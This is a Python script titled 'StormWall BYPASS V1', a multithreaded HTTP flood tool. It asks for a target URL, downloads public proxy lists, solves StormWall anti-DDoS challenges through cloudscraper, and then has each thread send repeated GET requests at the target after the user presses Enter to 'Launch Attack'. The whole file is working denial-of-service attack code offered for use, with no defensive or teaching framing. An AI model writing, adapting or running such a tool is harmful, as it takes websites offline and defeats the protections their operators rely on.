# -*- coding: utf-8 -*-
# # -*- coding: unknown-encoding -*-
# -*- coding: latin-1 -*-
import unicodedata

import cloudscraper
from bypass import stormwall

def injection(session, response):
    sw = stormwall(session, response)
    if sw.is_sw_challenge():
        return sw.handle_sw_challenge()
    else:
        return response

scraper = cloudscraper.create_scraper(requestPostHook=injection)

from python_anticaptcha import AnticaptchaClient, NoCaptchaTaskProxylessTask
import os
import random
import time
from sys import argv, exit
from threading import Thread
import requests
import threading
from colorama import Fore
from time import sleep
from urllib.parse import urlsplit
from logging import getLogger
import socks
import socket
import ssl
print(Fore.YELLOW + """  
StormWall BYPASS V1
""")

def attack():
	for a in range(thread):
		x = threading.Thread(target=bypass)
		x.start()
		print("Threads " + str(a+1) + " Created ")
	print(Fore.RED + "Waiting to solve StormWall")
	time.sleep(10)
	input(Fore.CYAN + "Press Enter To Launch Attack !")
	global bbs
	bbs = True

bbs = False
def main():
	global uri
	global list
	global sess
	global thread
	global req
	uri = str(input(Fore.RED + "Target URL : " + Fore.WHITE))
	ssl = str(input(Fore.BLUE + "SSL Mode (y/n) : " + Fore.WHITE))
	ge = str(input(Fore.GREEN + "Download Proxies (y/n) : " + Fore.WHITE))
	if ge =='y':
		if ssl == 'y':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=yes&timeout=2000')
      
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Sucess Get Https Proxies List !")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=all&timeout=1000')
      
			with open('proxies.txt','wb') as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Sucess Get Http Proxies List !")
	else:
		pass
	list = str(input(Fore.GREEN + "Proxy List (proxies.txt) : " + Fore.WHITE))
	sess = open(list).readlines()
	print(Fore.RED + "Proxies Count : " + Fore.WHITE + "%d" %len(sess))
	thread = int(input(Fore.RED + "Threads : " + Fore.WHITE))
	req = int(input(Fore.GREEN + "Req per Thread (1-300) : " + Fore.WHITE))
	attack()

def bypass():
	sess = open(list).readlines()

	scraper.proxies = {}
	time.sleep(5)
	while True:
		while bbs:
			try:
				scraper.get(uri)
				print(Fore.GREEN + "StormWall Bypassed")
				try:
					for g in range(req):
						scraper.get(uri)
						print(Fore.GREEN + "StormWall Bypassed")
					scraper.close()
				except:
					scraper.close()
			except:
				scraper.close()
				print(Fore.RED + "Bypass Failed")


if __name__ == "__main__":
	main()